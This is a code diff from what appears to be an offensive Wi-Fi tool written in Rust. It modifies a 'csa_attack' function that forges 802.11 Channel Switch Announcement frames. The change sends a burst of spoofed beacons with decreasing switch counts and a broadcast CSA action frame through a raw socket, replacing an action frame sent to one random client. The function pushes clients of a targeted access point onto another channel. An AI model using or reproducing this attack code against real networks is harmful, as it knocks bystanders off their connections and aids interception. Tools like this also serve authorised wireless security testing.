@@ -36,7 +36,7 @@ use crate::{
 //                                                          //
 //////////////////////////////////////////////////////////////
 
-pub fn csa_attack(oxide: &mut OxideRuntime, mut beacon: Beacon) -> Result<(), String> {
+pub fn csa_attack(oxide: &mut OxideRuntime, beacon: Beacon) -> Result<(), String> {
     if oxide.config.disable_csa {
         return Ok(());
     }
@@ -74,48 +74,44 @@ pub fn csa_attack(oxide: &mut OxideRuntime, mut beacon: Beacon) -> Result<(), St
 
     // If we are transmitting
     if !oxide.config.notx {
-        let random_client = ap_data
-            .client_list
-            .get_random()
-            .map(|client| client.mac_address);
-
-        // Send a CSA action frame to a random client
-        if let Some(client) = random_client {
-            let frx = build_csa_action(&client, &ap_data.mac_address, new_channel);
+        // Send 5 beacons with decreasing counts
+        for count in (0..6).rev() {
+            let frx = build_csa_beacon(beacon.clone(), new_channel.into(), count);
             let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
             oxide.status_log.add_message(StatusMessage::new(
                 MessageType::Info,
                 format!(
-                    "CSA Attack (Action): {} => {} ({}) Channel: {}",
+                    "CSA Attack (Beacon): {} ({}) Channel: {} | Count: {}",
                     ap_mac,
-                    client,
                     beacon
                         .station_info
                         .ssid
                         .clone()
                         .unwrap_or("Hidden".to_string()),
-                    new_channel
+                    new_channel,
+                    count
                 ),
             ));
         }
 
-        // Send beacons too
-        for _ in 0..10 {
-            let frx = build_csa_beacon(beacon.clone(), new_channel.into());
-            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
-        }
+        let client = MacAddress::broadcast();
 
-        ap_data.interactions += 1;
-        ap_data.auth_sequence.state = 1;
+        // Send a CSA action frame to broadcast
+        let frx = build_csa_action(&client, &ap_data.mac_address, new_channel);
+        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
         oxide.status_log.add_message(StatusMessage::new(
             MessageType::Info,
             format!(
-                "CSA Attack (Beacon*10): {} ({}) Channel: {}",
+                "CSA Attack (Action): {} => {} ({}) Channel: {}",
                 ap_mac,
+                client,
                 beacon.station_info.ssid.unwrap_or("Hidden".to_string()),
                 new_channel
             ),
         ));
+
+        ap_data.interactions += 1;
+        ap_data.auth_sequence.state = 1;
     }
 
     Ok(())
